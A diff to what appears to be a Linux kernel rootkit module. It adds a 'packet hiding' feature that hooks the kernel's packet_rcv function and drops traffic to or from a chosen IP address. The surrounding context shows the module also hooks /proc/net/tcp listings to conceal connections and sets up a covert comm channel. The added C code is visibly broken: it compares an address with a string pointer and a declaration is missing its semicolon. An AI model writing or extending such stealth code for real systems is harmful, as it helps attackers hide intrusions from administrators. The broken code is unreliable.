@@ -44,7 +44,6 @@
 
 #include <linux/utsname.h>
 
-
 #define TMPSZ 150
 
 /*
@@ -66,6 +65,88 @@
 #define IS_NOT_OPENSUSE
 #endif
 */
+
+
+
+/* PACKET HIDDING ADDINGS */
+
+#include <linux/types.h>
+#include <linux/mutex.h>
+#include <linux/sched.h>
+
+#include <linux/inet.h>
+#include <linux/ip.h>
+#include <linux/ipv6.h>
+#include <linux/netfilter_defs.h>
+
+
+int packet_check(struct sk_buff *skb)
+{
+	/* IP address we want to drop packets from, in NB order */
+         static unsigned char *drop_ip = "\x7f\x00\x00\x01";
+	
+	/* check for ipv4 */
+	if (skb->protocol == htons(ETH_P_IP)) {
+		/* get ipv4 header */
+		struct iphdr *header = ip_hdr(skb);
+
+		/* look for source and destination address */
+		/*
+		if(find_packet_ipv4((u8 *)&header->saddr) 
+			|| find_packet_ipv4((u8 *)&header->daddr)) {
+		*/
+		if(header->saddr == drop_ip || header->daddr == drop_ip){
+			debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+
+			/* ip in list, should be hidden */
+			return 1;
+		}
+	}
+
+	/* no ipv4 or ipv6 packet or not found in list */
+	return 0;
+}
+			
+
+int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev, 
+	struct packet_type *pt, struct net_device *orig_dev)
+{
+	int ret;
+
+	//inc_critical(&lock_packet_rcv, &accesses_packet_rcv);
+
+	/* Check if we need to hide packet */
+	if(packet_check(skb)) {
+		debug("PACKET DROP");
+		//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+		return NF_DROP;
+	}
+
+	/* switch functions */
+	/*
+	reset_packet_rcv();
+	ret = original_packet_rcv(skb, dev, pt, orig_dev);
+	hijack_packet_rcv();
+	*/
+	
+	int (*original_packet_rcv)(struct sk_buff *, struct net_device *, 
+	struct packet_type *, struct net_device *)
+		
+	original_packet_rcv = asm_hook_unpatch(fake_packet_rcv);
+	ret = original_packet_rcv(skb, dev, pt, orig_dev);
+	asm_hook_patch(fake_packet_rcv);
+	
+
+	//dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
+	debug("PACKET ACCEPT");
+
+	return ret;
+}
+
+
+/*------------------------------*/
+
+
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
 
@@ -1246,6 +1327,14 @@ int init(void)
     }
 
     pr_info("Comm channel is set up\n");
+	
+	
+   /* PACKET HIDDING ADDINGS */	
+	
+asm_hook_create((void *)kallsyms_lookup_name("packet_rcv"), fake_packet_rcv);
+	
+	
+/* -----------------------*/
 	
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), n_tcp4_seq_show);
     asm_hook_create(get_tcp_seq_show("/proc/net/tcp6"), n_tcp6_seq_show);
